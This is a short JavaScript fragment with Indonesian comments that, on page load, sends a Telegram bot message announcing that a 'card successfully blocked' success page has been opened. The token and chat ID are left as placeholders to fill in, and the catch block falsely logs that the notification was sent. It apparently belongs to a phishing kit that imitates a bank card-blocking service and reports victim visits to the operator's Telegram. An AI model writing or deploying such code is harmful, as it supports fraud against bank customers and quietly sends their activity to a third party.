// ================= KONFIGURASI TELEGRAM =================
const TELEGRAM_BOT_TOKEN = "MASUKKAN_BOT_TOKEN_ANDA";
const TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA";
// =========================================================

// Kirim notifikasi halaman sukses dibuka
window.addEventListener('load', async function() {
    try {
        const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const pesan = `
✅ KARTU BERHASIL DIBLOKIR — HALAMAN SUKSES DIBUKA
━━━━━━━━━━━━━━━━━━━━
📅 Waktu: ${waktu}
📌 Status: Halaman sukses dimuat
━━━━━━━━━━━━━━━━━━━━
        `.trim();

        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: pesan,
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        console.log('Telegram notifikasi terkirim');
    }
});
</script>
